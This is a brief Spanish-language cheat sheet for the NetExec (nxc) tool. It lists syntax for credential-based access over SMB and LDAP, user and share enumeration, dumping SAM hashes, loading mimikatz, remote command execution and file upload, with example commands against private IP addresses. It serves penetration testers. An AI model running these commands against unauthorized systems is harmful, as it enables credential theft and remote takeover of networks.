
```
nxc [-u usuario] [-p pass/hashes/ticket] [opciones/módulos]
```

```
nxc smb 192.168.1.0/24 -u admin -p Pass123
```

|**Parámetro / Subcomando**|**Función**|**Ejemplo de Sintaxis**|
|---|---|---|
|`-u`|Especifica el nombre de usuario.|`nxc smb 192.168.1.0/24 -u 'admin'`|
|`-p`|Especifica la contraseña o el hash NT.|`nxc smb 10.0.0.5 -u 'user' -p 'P@ssword!'`|
|`--shares`|Enumera los recursos compartidos y permisos.|`nxc smb 10.0.0.5 -u 'u' -p 'p' --shares`|
|`--sam`|Vuelca los hashes de la base de datos SAM.|`nxc smb 10.0.0.5 -u 'u' -p 'p' --sam`|
|`-M`|Carga un módulo específico (ej. `mimikatz`).|`nxc smb 10.0.0.5 -u 'u' -p 'p' -M mimikatz`|
|`--pass-pol`|Obtiene la política de contraseñas del dominio.|`nxc ldap 10.0.0.5 -u 'u' -p 'p' --pass-pol`|
|`-x`|Ejecuta un comando de sistema (vía SMB/WMI).|`nxc smb 10.0.0.5 -u 'u' -p 'p' -x 'whoami'`|
|`--users`|Enumera los usuarios del dominio (vía LDAP/RPC).|`nxc smb 10.0.0.5 -u 'u' -p 'p' --users`|
|`--groups`|Enumera los grupos del dominio.|`nxc ldap 10.0.0.5 -u 'u' -p 'p' --groups`|
|`--put`|Sube un archivo al objetivo.|`nxc smb 10.0.0.5 -u 'u' -p 'p' --put /tmp/file.exe`|
